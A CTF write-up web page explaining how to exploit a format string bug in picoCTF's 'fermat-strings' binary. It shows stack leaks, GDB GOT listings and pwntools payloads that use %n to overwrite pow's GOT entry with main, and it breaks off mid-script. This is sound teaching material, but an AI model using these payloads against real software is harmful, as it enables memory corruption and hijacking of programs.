<!doctype html><html lang=es>
<head>
<title>fermat-strings | 7Rocky</title><meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge,chrome=1">
<meta name=viewport content="width=device-width,minimum-scale=1">
<meta name=description content="We are given a 64-bit binary called chall:
Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000)  We also have the C source code. Basically, what the program does is request two numbers and try to find one that breaks Fermat&rsquo;s Last Theorem.
As a reminder, Fermat&rsquo;s Last Theorem claims that there are no positive integers $a$, $b$, $c$, that satisfy the equation:">
<meta name=robots content="index, follow">
<meta name=image content="https://7rocky.github.io/images/pwn.png">
<meta name=author content="7Rocky">
<meta property="og:title" content="fermat-strings">
<meta property="og:description" content="We are given a 64-bit binary called chall:
Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000)  We also have the C source code. Basically, what the program does is request two numbers and try to find one that breaks Fermat&rsquo;s Last Theorem.
As a reminder, Fermat&rsquo;s Last Theorem claims that there are no positive integers $a$, $b$, $c$, that satisfy the equation:">
<meta property="og:type" content="article">
<meta property="og:url" content="https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/fermat-strings/"><meta property="article:section" content="ctf">
<meta property="article:modified_time" content="2022-03-03T10:58:32+01:00"><meta property="og:site_name" content="7Rocky">
<meta property="og:image" content="https://7rocky.github.io/images/pwn.png">
<meta property="og:author" content="7Rocky">
<meta itemprop=name content="fermat-strings">
<meta itemprop=description content="We are given a 64-bit binary called chall:
Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000)  We also have the C source code. Basically, what the program does is request two numbers and try to find one that breaks Fermat&rsquo;s Last Theorem.
As a reminder, Fermat&rsquo;s Last Theorem claims that there are no positive integers $a$, $b$, $c$, that satisfy the equation:">
<meta itemprop=dateModified content="2022-03-03T10:58:32+01:00">
<meta itemprop=wordCount content="2483">
<meta itemprop=keywords content>
<meta name=twitter:card content="summary">
<meta name=twitter:title content="fermat-strings">
<meta name=twitter:description content="We are given a 64-bit binary called chall:
Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000)  We also have the C source code. Basically, what the program does is request two numbers and try to find one that breaks Fermat&rsquo;s Last Theorem.
As a reminder, Fermat&rsquo;s Last Theorem claims that there are no positive integers $a$, $b$, $c$, that satisfy the equation:">
<meta name=twitter:image content="https://7rocky.github.io/images/pwn.png">
<meta name=twitter:author content="7Rocky">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script>
<link rel="shortcut icon" href=/images/favicon.ico type=image/x-icon>
<link href=/css/style.css rel=stylesheet>
<link href=/css/monokai-sublime.min.css rel=stylesheet>
<link href=/css/code.css rel=stylesheet>
<link href=/css/main.css rel=stylesheet>
<script src=/js/highlight.min.js></script>
<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script>
<script src=//mozilla.github.io/pdf.js/build/pdf.js></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script type=text/x-mathjax-config>MathJax.Hub.Config({messageStyle:'none',tex2jax:{displayMath:[['$$','$$']],inlineMath:[['$','$']],processEnvironments:!0,processEscapes:!0,skipTags:['noscript','pre','script','style','textarea'],TeX:{equationNumbers:{autoNumber:'AMS'},extensions:['AMSmath.js','AMSsymbols.js']}}})</script>
<script src=/js/main.js></script>
<div style=display:none>
$
\newcommand{\e}{e}
\newcommand{\N}[1][]{\mathbb{N}^{#1}}
\newcommand{\Q}[1][]{\mathbb{Q}^{#1}}
\newcommand{\R}[1][]{\mathbb{R}^{#1}}
\newcommand{\Z}[1][]{\mathbb{Z}^{#1}}
\newcommand{\C}[1][]{\mathbb{C}^{#1}}
\newcommand{\dx}{\,\mathrm{d}x}
\newcommand{\dy}{\,\mathrm{d}y}
\newcommand{\dz}{\,\mathrm{d}z}
\newcommand{\dt}{\,\mathrm{d}t}
\newcommand{\divides}{\, | \,}
\newcommand{\st}{\; | \;}
\renewcommand{\geq}{\geqslant}
\renewcommand{\leq}{\leqslant}
\renewcommand{\i}{\mathrm{i}}
\newcommand{\rank}{\mathop{\mathrm{rank}}}
\newcommand{\tr}{\mathop{\mathrm{tr}}}
\newcommand{\charField}{\mathop{\mathrm{char}}}
\newcommand{\Image}{\mathop{\mathrm{Im}}}
$
</div></head><body class="ma0 production">
<header>
<div class=bg-black>
<nav class="pv3 ph3 ph4-ns" role=navigation>
<div class="flex-l justify-between items-center center">
<a class="f3 fw2 hover-white no-underline white-90 dib" href=/en/ title=7Rocky>7Rocky</a>
<div class="flex-l items-center">
<a class="link-transition github link dib z-999 pt3 pt0-l mr3" href=/ctf/picoctf/binary-exploitation/fermat-strings/ title=es>
<img alt=es height=32px src=/images/es.png width=32px>
</a>
<ul class="pl0 ml3 mr3">
<li class="list f5 f4-ns fw4 dib pr3">
<a class="hover-white no-underline white-90" href=/en/ctf/ title=CTF>CTF</a>
</li><li class="list f5 f4-ns fw4 dib pr3">
<a class="hover-white no-underline white-90" href=/en/htb/ title=HTB>HTB</a>
</li><li class="list f5 f4-ns fw4 dib pr3">
<a class="hover-white no-underline white-90" href=/en/imc/ title=IMC>IMC</a>
</li></ul><a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
<a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="Github link" rel=noopener aria-label="follow on Github——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
</div></div></nav></div></header><main class=pb7 role=main>
<article class="flex-l flex-wrap justify-between mw8 center ph3">
<header class="mt4 w-100">
<aside aria-label=aside class="instapaper_ignoref b helvetica tracked">BINARY EXPLOITATION</aside><div id=sharing class=mt3>
<a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/fermat-strings/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
</a>
<a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/fermat-strings/&text=fermat-strings" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a>
<a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/fermat-strings/&title=fermat-strings" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a>
</div><h1 class="f1 mt3 mb1">fermat-strings</h1><br>
</header><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>We are given a 64-bit binary called <code>chall</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>Arch:     amd64-64-little
RELRO:    <span class=code-dark-yellow>Partial RELRO</span>
Stack:    <span class=code-dark-green>Canary found</span>
NX:       <span class=code-dark-green>NX enabled</span>
PIE:      <span class=code-dark-red>No PIE (0x400000)</span>
</code></pre></div><p>We also have the C source code. Basically, what the program does is request two numbers and try to find one that breaks Fermat&rsquo;s Last Theorem.</p><p>As a reminder, Fermat&rsquo;s Last Theorem claims that there are no positive integers $a$, $b$, $c$, that satisfy the equation:</p><p>$$
a ^ n + b ^ n = z ^ n
$$</p><p>For $n > 2$.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;math.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#75715e>#define SIZE 0x100
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>void</span>) {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> A[SIZE];
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> B[SIZE];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> a <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> b <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  puts(<span style=color:#e6db74>&#34;Welcome to Fermat</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#39;s Last Theorem as a service&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  setbuf(stdout, NULL);
</span></span><span style=display:flex><span>  setbuf(stdin, NULL);
</span></span><span style=display:flex><span>  setbuf(stderr, NULL);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  printf(<span style=color:#e6db74>&#34;A: &#34;</span>);
</span></span><span style=display:flex><span>  read(<span style=color:#ae81ff>0</span>, A, SIZE);
</span></span><span style=display:flex><span>  printf(<span style=color:#e6db74>&#34;B: &#34;</span>);
</span></span><span style=display:flex><span>  read(<span style=color:#ae81ff>0</span>, B, SIZE);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  A[strcspn(A, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>  B[strcspn(B, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  a <span style=color:#f92672>=</span> atoi(A);
</span></span><span style=display:flex><span>  b <span style=color:#f92672>=</span> atoi(B);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (a <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>||</span> b <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>    puts(<span style=color:#e6db74>&#34;Error: could not parse numbers!&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> buffer[SIZE];
</span></span><span style=display:flex><span>  snprintf(buffer, SIZE, <span style=color:#e6db74>&#34;Calculating for A: %s and B: %s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, A, B);
</span></span><span style=display:flex><span>  printf(buffer);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> answer <span style=color:#f92672>=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>100</span>; i<span style=color:#f92672>++</span>) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (pow(a, <span style=color:#ae81ff>3</span>) <span style=color:#f92672>+</span> pow(b, <span style=color:#ae81ff>3</span>) <span style=color:#f92672>==</span> pow(i, <span style=color:#ae81ff>3</span>)) {
</span></span><span style=display:flex><span>      answer <span style=color:#f92672>=</span> i;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (answer <span style=color:#f92672>!=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>) printf(<span style=color:#e6db74>&#34;Found the answer: %d</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, answer);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>On the source code we can see a Format String vulnerability:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-c data-lang=c><span style=display:flex><span>snprintf(buffer, SIZE, <span style=color:#e6db74>&#34;Calculating for A: %s and B: %s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, A, B);
</span></span><span style=display:flex><span>printf(buffer);
</span></span></code></pre></div><p>Because we can add format strings into <code>buffer</code> which is the first argument of <code>printf</code>. However, we need to enter a valid number in <code>A</code> and <code>B</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-c data-lang=c><span style=display:flex><span>printf(<span style=color:#e6db74>&#34;A: &#34;</span>);
</span></span><span style=display:flex><span>read(<span style=color:#ae81ff>0</span>, A, SIZE);
</span></span><span style=display:flex><span>printf(<span style=color:#e6db74>&#34;B: &#34;</span>);
</span></span><span style=display:flex><span>read(<span style=color:#ae81ff>0</span>, B, SIZE);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>A[strcspn(A, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>B[strcspn(B, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>a <span style=color:#f92672>=</span> atoi(A);
</span></span><span style=display:flex><span>b <span style=color:#f92672>=</span> atoi(B);
</span></span></code></pre></div><p>But this is easy. Let&rsquo;s try:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>./chall</span>
Welcome to Fermat\'s Last Theorem as a service
A: 1.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
B: 1
Calculating for A: 1.400bd8.97161728.0.ffffffff.97161350.0.0.97161580.1.78252e31.252e7825.2e78252e.78252e78.252e7825 and B: 1
</code></pre></div><p>As we can see, we can dump values from the stack. And also, the value of the format string starts at position 10 (offset 10):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>./chall</span>
Welcome to Fermat\'s Last Theorem as a service
A: 1AAA%10$x
B: 1
Calculating for A: 1AAA41414131 and B: 1
</code></pre></div><p>The program will exit after we enter our input. We need to find a way of running again the program without stopping the process. This can be done using a the Format String vulnerability, because there is a format <code>%n</code> that allows to write the number of bytes written until <code>%n</code> into the address given as a parameter (the value of a position in the stack).</p><p>We notice that the binary has Partial RELRO, which means that the GOT is not writable during a Buffer Overflow exploitation, but it is writable via Format String. Hence, the idea is to change the value of an function in the GOT to point to <code>main</code> and be able to rerun the program as a result.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>gdb</span> -q chall
Reading symbols from <span class=code-dark-green>chall</span>...
(No debugging symbols found in <span class=code-dark-green>chall</span>)
<span class=code-red>gef➤</span>  break main
Breakpoint 1 at <span class=code-dark-blue>0x40083b</span>
<span class=code-red>gef➤</span>  run
Starting program: ./chall

Breakpoint 1, <span class=code-dark-blue>0x000000000040083b</span> in <span class=code-dark-yellow>main</span> ()
</code></pre></div><p>Now we show the GOT entries:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>  got

GOT protection: Partial RelRO | GOT functions: 9

[0x601018] <span class=code-dark-yellow>puts@GLIBC_2.2.5  →  0x4006c6</span>
[0x601020] <span class=code-dark-yellow>__stack_chk_fail@GLIBC_2.4  →  0x4006d6</span>
[0x601028] <span class=code-dark-yellow>setbuf@GLIBC_2.2.5  →  0x4006e6</span>
[0x601030] <span class=code-dark-yellow>printf@GLIBC_2.2.5  →  0x4006f6</span>
[0x601038] <span class=code-dark-yellow>snprintf@GLIBC_2.2.5  →  0x400706</span>
[0x601040] <span class=code-dark-yellow>pow@GLIBC_2.2.5  →  0x400716</span>
[0x601048] <span class=code-dark-yellow>strcspn@GLIBC_2.2.5  →  0x400726</span>
[0x601050] <span class=code-dark-yellow>read@GLIBC_2.2.5  →  0x400736</span>
[0x601058] <span class=code-dark-yellow>atoi@GLIBC_2.2.5  →  0x400746</span>
</code></pre></div><p>From the point where we have the <code>printf</code> vulnerability, only <code>pow</code> and <code>printf</code> are called. We are not interested in changing <code>printf</code>, so let&rsquo;s modify the entry for <code>pow</code>.</p><p>First, we are going to put the address in a position of the stack. Let&rsquo;s use the input <code>A</code> for entering the address and the input <code>B</code> to extract it. But before, let&rsquo;s do it with recognizable characters:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>./chall</span>
Welcome to Fermat\'s Last Theorem as a service
A: 1234567.AAAABBBB
B: 1.%11$lx
Calculating for A: 1234567.AAAABBBB and B: 1.4242424241414141
</code></pre></div><p>Notice the use of <code>%lx</code> to print an 8-byte value, and the position 11 because in position 10 we have <code>1234567.</code>.</p><p>Now, we can replace <code>AAAABBBB</code> with the address of <code>pow</code> at GOT. And instead of putting <code>%11$lx</code>, we will put <code>%11$n</code>. Let&rsquo;s do it in a Python script with <code>pwntools</code> and attach GDB to visualize the GOT entries:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span>payload_a <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;1234567.&#39;</span> <span style=color:#f92672>+</span> p64(pow_got)
</span></span><span style=display:flex><span>payload_b <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;1.%11$n&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>gdb<span style=color:#f92672>.</span>attach(p, gdbscript<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;break pow</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>continue</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>got&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;A: &#39;</span>, payload_a)
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;B: &#39;</span>, payload_b)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>interactive()
</span></span></code></pre></div><p>If we run it, GDB will attach to it, break at <code>pow</code> and then show the GOT:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>GOT protection: Partial RelRO | GOT functions: 9

[0x601018] <span class=code-dark-green>puts@GLIBC_2.2.5  →  0x7f4c7b0845a0</span>
[0x601020] <span class=code-dark-yellow>__stack_chk_fail@GLIBC_2.4  →  0x4006d6</span>
[0x601028] <span class=code-dark-green>setbuf@GLIBC_2.2.5  →  0x7f4c7b08bc50</span>
[0x601030] <span class=code-dark-green>printf@GLIBC_2.2.5  →  0x7f4c7b061e10</span>
[0x601038] <span class=code-dark-green>snprintf@GLIBC_2.2.5  →  0x7f4c7b061ee0</span>
[0x601040] <span class=code-dark-green>pow@GLIBC_2.2.5  →  0x28</span>
[0x601048] <span class=code-dark-green>strcspn@GLIBC_2.2.5  →  0x7f4c7b1837b0</span>
[0x601050] <span class=code-dark-green>read@GLIBC_2.2.5  →  0x7f4c7b10e130</span>
[0x601058] <span class=code-dark-green>atoi@GLIBC_2.2.5  →  0x7f4c7b044730</span>
</code></pre></div><p>The entry for <code>pow</code> has changed to <code>0x28</code> (40). This means that until the <code>%11$n</code>, we have printed 40 bytes. Since we have only <code>1.</code> before <code>%11$n</code>, this means that there are 38 bytes in the stack before. If we put <code>1..</code>, then the GOT entry would change to <code>0x29</code>, and so on.</p><p>At this moment, we need to enter the address of <code>main</code> (<code>0x400837</code>, which is 4196407 in decimal) in the GOT entry. However, we cannot introduce this number of bytes because it is too large.</p><p>But we can make use of another format string. Since the address we need to be written is 4196407, then we must print 4196407 - 38 - 2 = 4196367 bytes. And this can be done with a format string like <code>%4196367c</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span>pow_got <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x601040</span>
</span></span><span style=display:flex><span>payload_a <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;1234567.&#39;</span> <span style=color:#f92672>+</span> p64(pow_got)
</span></span><span style=display:flex><span>payload_b <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;1.</span><span style=color:#e6db74>%4196367c</span><span style=color:#e6db74>&#39;</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;%11$n&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;A: &#39;</span>, payload_a)
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;B: &#39;</span>, payload_b)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>interactive()
</span></span></code></pre></div><p>The computation of the number of bytes to write can be done as follows:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span>pow_got <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x601040</span>
